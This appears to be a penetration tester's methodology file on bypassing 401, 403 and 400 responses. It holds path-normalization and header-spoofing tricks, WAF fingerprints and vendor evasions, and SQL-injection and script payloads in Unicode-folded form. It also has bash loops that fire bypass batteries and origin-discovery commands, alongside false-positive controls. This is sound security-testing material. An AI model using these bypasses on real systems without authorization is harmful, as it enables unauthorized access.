# Moraa — 403 / 401 / 400 bypass

> Load when a promising path returns 401/403/400. Distinguish **WAF/proxy 403** (edge) from **app
> 403** (authz) — the tricks below beat edge/path-normalization gates, not real authorization. If it's
> an app authz 403, go to `framework-misconfig.md §7` (authz methodology) instead.

## First: who said no?
```bash
curl -skI https://T/admin | grep -iE 'server|via|x-cache|cf-ray|x-amzn|akamai'   # edge fingerprint
# app 403 usually JSON/permission msg; edge 403 usually HTML/"Request blocked"/CloudFront/Akamai page.
```

## Path / normalization tricks (edge allowlist vs backend disagree)
```
/admin        →  /Admin  /ADMIN  /admin/  /admin//  /./admin  /admin/.  /%2e/admin
/admin        →  /admin%20  /admin%09  /admin?  /admin#  /admin.json  /admin;/  /admin.;/
/admin        →  //admin  /./admin/./  /admin/..;/admin  /%2f/admin  /..%2fadmin
/admin/x      →  /admin/%2e/x  /admin/x..;/  /admin/;foo=bar/x   (Tomcat/Spring path-param ;)
encoded:  %2561dmin (double-url), unicode dot ％2e, overlong UTF-8, trailing %00 / %0a
case & ext:  path.PHP, path.json, path~, path.bak, path%2ejson
```

## Header tricks (spoof source / original URL the backend trusts)
```
X-Original-URL: /admin        X-Rewrite-URL: /admin        (front blocks /admin, backend honors header)
X-Forwarded-For: 127.0.0.1    X-Real-IP: 127.0.0.1         X-Forwarded-Host: localhost
X-Custom-IP-Authorization: 127.0.0.1   X-Originating-IP    X-Remote-IP    X-Client-IP
X-Forwarded-Server: localhost  Forwarded: for=127.0.0.1;host=localhost;proto=https
Referer: https://T/admin       X-Forwarded-Scheme: http     Content-Length: 0 (on some 405→bypass)
# identity-proxy headers backends trust (privesc, not just path):
X-Forwarded-Email / X-Auth-Request-Email / X-User-Id / X-Admin-Target / Cf-Access-... (framework-misconfig §4)
```

## Method tricks
```
GET→POST / HEAD / OPTIONS / PUT / PATCH / TRACE / arbitrary (FOOBAR) verb
X-HTTP-Method-Override: PUT      X-HTTP-Method: DELETE     _method=PUT (Rails/Laravel form)
HTTP/1.0 vs 1.1 vs h2; add/remove trailing slash together with method swap
```

## 401 specific
```
- endpoint 401 but a sibling/older API (v1 vs v2, /internal, mobile API) is unauth → shadow API.
- missing-auth != always-auth: try no token, empty token, expired, another user's, alg:none JWT.
- static/asset path serves the same protected data (CDN cache of an authed response).
- WebSocket / GraphQL variant of the REST endpoint may skip the auth middleware.
```

## 400 specific (often malformed-input, not authz)
```
- content-type: switch application/json ↔ x-www-form-urlencoded ↔ multipart ↔ text/plain.
- charset/encoding: add ;charset=utf-8, chunked transfer-encoding, extra/rewrapped body.
- validation-before-authz (framework-misconfig §7): a 400 on a bad value can mask a role gate —
  send a VALID-format value to see the real 401/403/200.
- missing required field → the 400 message often leaks the schema; add fields incrementally.
- API-gateway "Missing Authentication Token" = wrong route, not a 400 to bypass — find the real path.
```

## Soft-block detection — a 200 is NOT proof of bypass
WAF vendors often answer blocked requests with `200 OK` + a block-page body. Sample the target with
a known-bad payload first to get a block baseline, then diff every "hit" against it (body
length/content, not just status code).
```
Cloudflare   200 + cf-challenge-form / "Attention Required"
F5 BIG-IP    200 + "The requested URL was rejected" + Support ID: xxxx
Imperva      200 + CAPTCHA page + _Incapsula_Resource
Generic      200 + "Your request has been blocked. Log ID: WAF-..."
```
**Positive bypass signals** (you reached PAST the edge): `401` (hit real auth middleware), `500`
(payload triggered a backend exception — SQLi/SSTI lead), `502`/`503` (request forwarded to origin).
A "bypass" is only real when status ∈ {200,201,204,301,302,401,500,502,503} AND body diverges from
the block baseline by a real margin (not just a different session id in the same block page).

## WAF fingerprint (identify before you pick a bypass table row)
| WAF | Signature |
|---|---|
| Cloudflare | `cf-ray:` header, `__cfduid`/`__cf_bm` cookie |
| AWS WAF | `x-amzn-requestid:`, `x-amz-cf-id:` headers |
| Imperva/Incapsula | `incap_ses_*` / `visid_incap_*` cookies |
| F5 BIG-IP ASM | `TS01abcdef`-style cookie |
| Akamai | `akamai-x-*` headers |
| ModSecurity | `mod_security`/`NAXSI` string in 4xx body |

## Vendor-specific bypass (once fingerprinted)
| WAF | Bypass | Why |
|---|---|---|
| Cloudflare | `Transfer-Encoding: chunked` + `X-Forwarded-Host: localhost` | chunked TE confuses the CF parser |
| Cloudflare | direct origin IP (skip the WAF entirely — see below) | edge never sees the request |
| AWS WAF | body >8KB | cheap tier skips inspection above the size cap |
| Imperva | `?id=1&id=2 UNION SELECT` (param pollution) | WAF inspects the first value, backend uses the last |
| F5 BIG-IP | `//admin` (double slash) | path-normalization mismatch edge vs backend |

## Origin-server discovery — skip the WAF, don't out-trick it
```bash
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u   # pre-WAF cert history
shodan search "ssl.cert.subject.cn:$TARGET"                                              # cert-match hosts
curl -s "https://viewdns.info/iphistory/?domain=$TARGET"                                 # historical DNS
curl --resolve "$TARGET:443:<origin-ip>" "https://$TARGET/admin"                         # hit origin directly
```

## NGINX/backend path-terminator chars (access-control mismatch, not just a 403 page)
| Backend | Bypass char | Example |
|---|---|---|
| Node.js/Express | `\xA0` (NBSP) | `/admin\xA0` |
| Flask/Python | `\x85`, `\xA0` | `/admin\x85` |
| Spring Boot | trailing `;` | `/admin;` |
| PHP-FPM | path-info | `/admin.php/index.php` |

## Hop-by-hop header stripping (defeats header-keyed access checks)
List a header in `Connection:` to make an intermediate proxy strip it before the backend sees it —
if the backend then defaults to "allow" on a missing header (e.g. no XFF = trusted internal call):
```
Connection: X-Forwarded-For, Keep-Alive
X-Forwarded-For: <real-ip-that-would-otherwise-be-blocked>
```
Standard strippable: `Connection, Keep-Alive, Proxy-Authenticate, Proxy-Authorization, TE, Trailer,
Transfer-Encoding`. Often also strippable though non-standard: `Authorization, Cookie,
X-Forwarded-For, X-Real-IP`.

## Parser-differential bypasses (WAF reads bytes one way, backend decodes another)
> Named as a distinct cross-cutting methodology at PortSwigger Research Top 10 2025 (#10, author
> @joernchen, "Parser Differentials"): two components in a stack — proxy vs. app, two parsing
> libraries, WAF vs. backend as here — interpret IDENTICAL input differently, and that
> interpretation gap is the actual mechanism behind a lot of otherwise-unrelated-looking bypass
> classes (this section's WAF/backend gap, `request-smuggling.md`'s CL.TE/TE.CL front/back
> disagreement, and any auth-bypass built on a normalization mismatch). When a bypass table row
> below works, it's this same root cause wearing a different costume — worth naming explicitly
> when writing up a finding, since "parser differential" explains WHY it works, not just that it
> does.
```
No Content-Type header at all                    → some WAFs skip body inspection entirely
{"field1"\x00: "payload"}                         → null byte in JSON key breaks WAF's JSON parser
Content-Type: ...; charset=utf-16 + UTF-16 body   → WAF sees garbage, XML/JSON parser decodes correctly
Content-Type: ...; charset=ibm037 (EBCDIC) body   → WAF only decodes UTF-8/ASCII; IIS decodes ibm037 natively
```

### Unicode compatibility normalization (NFKC applied AFTER the filter)
If the app (or a framework layer such as a Python/Java/.NET normalizer, an ORM, or a template
engine) runs NFKC/NFKD normalization AFTER the WAF or input validator has inspected the bytes,
compatibility characters that the filter does not recognise fold down into the ASCII the filter was
built to block.
```
＜script＞alert(1)＜/script＞      fullwidth < > (U+FF1C/U+FF1E)   → NFKC → <script>
𝕃 ℬ ⅅ                             math alphanumerics             → NFKC → L B D
℀ ﬁ ﬀ ㍿                           ligatures/squared forms         → NFKC → a/c fi ff ...
ⅇ ⁽1⁾                              superscripts/subscripts        → NFKC → e (1)
K (U+212A Kelvin)                 → k          ı (U+0131) → I.upper().lower() → i
%c0%ae %e0%80%ae                  overlong UTF-8 encodings of '.'
```
Test harness — generate the candidates rather than hand-typing them:
```python
python3 - <<'EOF'
import unicodedata, sys
target = sys.argv[1] if len(sys.argv)>1 else "<script>"
for cp in range(0x20, 0x1FFFF):
    c = chr(cp)
    n = unicodedata.normalize("NFKC", c)
    if n and n != c and n in target:
        print(hex(cp), repr(c), "->", repr(n))
EOF
```
Confirm signal (BOTH halves required): the WAF returns 200/pass on the unicode form where it
returns 403 on the ASCII form, AND the backend's response shows the folded ASCII took effect
(reflected `<script>`, executed query, matched route). A 200 on a payload the backend also ignored
is nothing — same trap as the decode control at the bottom of this doc. This is the same
parser-differential root cause as the rest of this section, and the same mechanism behind the
identity-collision ATO recipe in `auth-oauth.md`.
Reference: https://jlajara.gitlab.io/Bypass_WAF_Unicode

## Automation
```bash
ffuf -w wordlist -u https://T/FUZZ -mc all                              # discover before bypassing
nuclei -t http/misconfiguration/ -u https://T
# 403 bypass tools (verify every hit manually):
byp4xx https://T/admin        # or: bypass-403.sh, 4-ZERO-3, nomore403
```
> Real win = the bypass returns the actual protected content/action, not a different 200 (login page,
> SPA shell). Diff the body. → `validate.md` → `findings/`.

---

## The decode control — an encoding "bypass" that lands on 404 proves NOTHING

The most seductive false positive in 4xx-bypass work. You find an edge rule blocking a path
(`server: awselb/2.0` / nginx / CloudFront returning HTML 403 while the app returns JSON), you throw
the encoding matrix at it, and some payloads come back with the **app's** `404 {"message":"Not found"}`
instead of the edge's HTML 403. It looks like you slipped past the WAF and just happened to land on a
route that doesn't exist.

Usually you didn't. Two very different things produce that identical result:

1. **Real bypass** — the edge matched literally, the app decoded `%61`→`a`, routed to `/admin/...`,
   and genuinely has no such route. The rule *is* bypassable; you just need a route that exists.
2. **No bypass at all** — the app does **not** percent-decode path segments either, so it received the
   literal string `%61dmin`, which matches nothing. You have reached the app, but you can never reach
   `admin` this way, because the decoded form is unreachable by construction.

**The control that separates them: apply the same encoding to a route you KNOW returns 200.**

```bash
# known-good route, plain  -> expect 200
curl -s -o /dev/null -w '%{http_code}\n' --path-as-is "$H/v1/announcements"      -H "$AUTH"
# same route, one char percent-encoded
curl -s -o /dev/null -w '%{http_code}\n' --path-as-is "$H/v1/%61nnouncements"    -H "$AUTH"
```

- encoded control → **200** ⇒ the app decodes ⇒ your bypass is real, go hunt a live route behind it.
- encoded control → **404** ⇒ the app does **not** decode ⇒ every "bypass" row is noise. Drop it.

Real case (notify.svc.acme.example, 2026-09-27): an ALB deny-rule blocked every path containing `admin`,
and five encodings (`%61dmin`, `%61%64%6d%69%6e`, `%2561dmin`, `%c0%a1dmin`, backslash) all returned the
app's JSON 404 — a textbook "edge rule defeated" table. The control then returned 404 for
`/v1/%61nnouncements` against a route that 200s when spelled plainly. The app never decodes; the whole
table was noise and there was no admin route anyway. Without the control that ships as a bogus
"WAF bypass" report.

**Always pair the bypass matrix with `--path-as-is` and a positive decode control.** Same principle as
`parameter-deep-dive.md` §0: establish what "reached the thing" looks like *before* you interpret a
payload result.


---

## The canary control — a WAF that trips mid-fuzz poisons your ENTIRE result set

Sibling trap to the decode control, and it costs you a whole run rather than one row.

Rate-based edge rules (AWS WAF/CloudFront, Akamai, Cloudflare) do not block the *offending request* —
they block **the source IP for a window**, for every path. If that trips in the middle of an ffuf
route sweep, every remaining request returns the edge's HTML 403. Your filter was `-fc 404`, so the
edge 403 scores as a **hit** and ffuf hands you a beautiful list of "discovered routes".

Seen live on `blobstore.svc.acme.example` (2026-09-29): a 4000-word sweep of
`/v1/organizations/{id}/FUZZ` returned 40 "routes" — `drivers`, `wp-admin`, `node`, `kernel`,
`Documentation`, `gcc` — i.e. verbatim the head of the wordlist. The service is a 9-route Go API.
Post-run, a known-good `/status` also returned the CloudFront HTML 403: the host had been blocked,
not enumerated.

**The control: interleave a known-good canary and abort when it stops being 200.**

```bash
# 1. canary BEFORE  (must be 200)
curl -s -o /dev/null -w 'canary-pre  %{http_code}\n' "$H/status"

# 2. fuzz slowly, and filter the EDGE page by size, not just by code
ffuf -u "$H/v1/organizations/$ID/FUZZ" -w words.txt -H "Cookie: $AUTH" \
     -fc 404 -fs 919 -t 5 -rate 20 -s          # 919 = CloudFront "Request blocked" body

# 3. canary AFTER — if this is not 200, THROW THE RESULTS AWAY and back off
curl -s -o /dev/null -w 'canary-post %{http_code}\n' "$H/status"
```

Rules of thumb:

- **Always `-fs` the edge-block body length**, not only `-fc 404`. Edge pages are a fixed size
  (CloudFront `Request blocked` = 919 bytes) and that one flag would have killed this false positive.
- Re-request **two** known paths after any sweep: one that existed and one that did not. Identical
  responses means you are blocked and the run is void.
- Behind CloudFront, `-t 5 -rate 20` is the ceiling for authed API fuzzing. Recovery windows run
  minutes, so a greedy run costs far more time than it saves.
- A `403` you only ever saw *during* a fuzz run is not evidence of anything. Re-verify single
  requests by hand, from a cold state, before it goes in the tracker.

### Corollary — the 403-vs-404 route oracle (use it instead of brute force)

On a Go/chi API the app 404 (`404 page not found`, 19 bytes) and an authz 403 (`{"code":"..."}`)
are different strings, so a **short, hand-picked** list of plausible route names maps the surface
with a few dozen requests and never trips the WAF. On `blobstore.svc.acme.example` that recovered the
complete 9-route table, including four `/v1/organizations/{id}/*` routes gated by
`403 NOT_MANAGING_ORGANIZATION`, while a 4000-word blast recovered nothing but a ban.

Also check whether the 403 is emitted by **middleware mounted on a prefix** rather than per route:
if `/v1/users/{notme}/totally-made-up` still returns `403 FORBIDDEN`, the mount itself is
detectable, and a 404 under that prefix then means "route absent" rather than "access denied" —
which lets you enumerate the self-scoped routes precisely.

---

## The decode control is PER-DISTRIBUTION — never generalise it across a host estate
*(Added 2026-10-01, from `acme-kms.svc.acme.example` vs `tenant-cloud.svc.acme.example`, same estate, same day.)*

The standing rule in this doc is: a 4xx-bypass matrix is meaningless without a decode control.
The refinement is that the control's answer is a property of **the individual CDN distribution /
edge config**, not of the target organisation. Two hosts in the same estate, probed within minutes
of each other, gave opposite answers:

```
# Host A — edge does NOT decode. Control = encode the path that is KNOWN to return 200:
/health        200      <- allowed
/%68ealth      403
/hea%6Cth      403
/%2Fhealth     403
/./health      403
/a/../health   403
=> every encoding of a GOOD path fails => the edge matches the raw path
=> the whole encoded-bypass table against this host is a TRUE NEGATIVE, and there is no
   normalisation gap to find. Stop; do not write up the 403s as "blocked payloads".

# Host B — edge DOES decode. Same control, allowed prefix is /api/*:
/api/v1        404 page not found   <- allowed, origin answers
/%61pi/v1      404 page not found   <- decoded, still allowed
/api/v%31      404 page not found
=> the edge decodes before matching
=> therefore the uniform 403 on /api/../health, /api/..%2fhealthz, /api/%2e%2e/metrics,
   /api/..;/metrics, /api/v1/../../debug/pprof/ is a REAL block (a WAF dot-segment rule),
   not a "the edge never decoded it" artifact.
```

Both outcomes are negatives, but they are *different* negatives and only the control distinguishes
them. Writing "encoded bypass blocked" without it is the exact false-positive this section exists to
kill — and writing "class tested clean" without it overstates a host where the class was never
actually exercised.

**Procedure:** pick the path on *that host* you have already proven returns 200 (or any non-403),
apply each encoding to *it*, and only then interpret the table against the forbidden paths. Re-run
this per host. One host's decode behaviour tells you nothing about its neighbour's.

**Bonus fingerprint from the same pass:** an edge that returns 403 *only when an `Origin` header is
present and non-allowlisted* (no-Origin → 200, `https://evil.target.com` → 200,
`https://evil.com` → 403) is judging the request at the CDN, not the app. If a probe 403s for no
apparent reason, strip the `Origin` header and retry before concluding the route is blocked.

---

## The CloudFront SPLIT-distribution fingerprint — and why the pre-prod sibling of an app is usually WAF-blocked, not absent

**Where it came from:** `protect.{,dev.,stg.}svc.acme.example` (the camera/NVR product evidence registry),
2026-10-14.

One hostname, two worlds. A short allowlist of exact path patterns goes to the application origin;
**everything else falls through to the default `/*` behaviour**, which on this estate is a
CloudFront *private* distribution. Learn the three byte-sizes and you can read the whole config off
the wire:

| Response | Meaning | Reliable tell |
|---|---|---|
| `403` + **146 B** `<Code>MissingKey</Code>` | matched the default `/*` behaviour = private distribution, no app route here | XML body, `Missing Key-Pair-Id query parameter or cookie value` |
| `403` + **919 B** `ERROR: The request could not be satisfied … Request blocked.` | matched an **app** behaviour, then AWS **WAF blocked** it | HTML block page, `X-Cache: Error from cloudfront` |
| `400`/`404` + JSON | reached the origin and the **app** rejected it | `traceId`, app error schema |
| `200` + JSON | reached the origin and it answered | — |

Two deductions you get for free:

- **919 B tells you the cache behaviour EXISTS.** If the path pattern were not configured, the
  request would have fallen through to `/*` and returned the 146 B `MissingKey`. So a pre-prod
  sibling returning 919 B on the app routes is *correctly configured and deliberately fenced*, not
  empty. Say that, instead of "host appears dead".
- **The block is path-scoped, not viewer-scoped,** if the same viewer IP still gets the normal 146 B
  `MissingKey` on `/` of the same hostname. A blanket IP deny would block both.

### Bypass battery for a WAF-fenced pre-prod sibling — in priority order

Run it **against the pre-prod host and the production host simultaneously**, because production is
your decode control (section "The decode control" above). A row only means something if prd shows
the edge normalised the mutation and still reached the origin.

```bash
for p in "/api/v2/app/x" "/./api/v2/app/x" "/a/../api/v2/app/x" "/%61pi/v2/app/x" \
         "//../api/v2/app/x" "/api/v2/app/x%20" "/api%2fv2/app/x" "/;/api/v2/app/x" \
         "/%09api/v2/app/x" "/.;/api/v2/app/x" "/API/v2/app/x"; do
  a=$(curl -s -g -o /dev/null -w '%{http_code}/%{size_download}' "https://prod.example.com$p")   # CONTROL
  d=$(curl -s -g -o /dev/null -w '%{http_code}/%{size_download}' "https://dev.example.com$p")
  printf '%-30s prd=%-10s dev=%s\n' "$p" "$a" "$d"
done
```

Read it like this:

- prd `200` on `/./api/…`, `/a/../api/…`, `/%61pi/…`, `//../api/…` -> **the edge normalises and
  %-decodes before routing.** Your control passes; the dev rows are now interpretable.
- dev still 919 B on those same four -> **the block decision is taken on the POST-normalisation
  URI.** No normalisation discrepancy between the WAF view and CloudFront behaviour matching. Stop;
  there is no path-level bypass.
- A row where prd falls to 146 B `MissingKey` (`/;/api/…`, `/%09api/…`, `/.;/api/…`, `/API/…`) is
  **not** a bypass candidate at all — the behaviour did not match, so even a WAF miss lands you on
  the private distribution. Case-shifting the path is the classic trap here: CloudFront path
  patterns are case-sensitive, so `/API/…` dodges a `starts_with /api/` WAF rule **and** dodges the
  behaviour that would route you to the app. Dodging both is not a bypass.

### AWS WAF viewer-IP spoofing — fire it, but know the default

An AWS WAF `IPSetReferenceStatement` evaluates the **TCP source address** unless the rule was
explicitly built with `ForwardedIPConfig` (header-sourced IP). When it *was*, an `X-Forwarded-For`
header is a one-line IP-allowlist bypass — so it is always worth 11 requests:

```bash
for h in "X-Forwarded-For: 127.0.0.1" "X-Forwarded-For: 10.0.0.1" "X-Forwarded-For: 192.168.1.1" \
         "X-Forwarded-For: 172.16.0.1" "X-Forwarded-For: 10.0.0.1, 1.2.3.4" \
         "True-Client-IP: 10.0.0.1" "X-Real-IP: 10.0.0.1" "CF-Connecting-IP: 10.0.0.1" \
         "X-Client-IP: 10.0.0.1" "X-Originating-IP: 10.0.0.1"; do
  printf '%-36s %s\n' "$h" "$(curl -s -o /dev/null -w '%{http_code}/%{size_download}' -H "$h" "https://dev.example.com/api/v2/app/x")"
done
```

Unchanged 919 B across all of them = the rule uses the TCP source. Record that as the negative; it
is what makes "no IP bypass" trustworthy rather than assumed.

### Then go AROUND the edge: the CT-disclosed origin hostname

If the authz is enforced at the edge, the origin is the bypass. On an estate that fronts ALBs with
CloudFront, the ALB hostname is usually **on the same certificate** and therefore in Certificate
Transparency:

```bash
curl -s 'https://crt.sh/?q=%25.svc.example.com&output=json' \
  | grep -o '"name_value":"[^"]*"' | sed 's/.*:"//;s/"$//' | sed 's/\\n/\n/g' \
  | tr 'A-Z' 'a-z' | sort -u > names.txt
grep -E '^internal[-.]' names.txt      # the origin tier
```

On `*.svc.acme.example` this returned a perfect 1:1 convention — **every public `X.svc.acme.example` has a
private SAN `internal-X.svc.acme.example` on the same cert.** That is a free direct-to-origin target list
for every host on the estate. (For `internal-protect.*` they were all NXDOMAIN, i.e. correctly
private — but the enumeration costs one request and closes the question with evidence instead of
assumption.) Control: keep one known-resolving host in the same loop so a `000` means NXDOMAIN and
not a dead resolver.
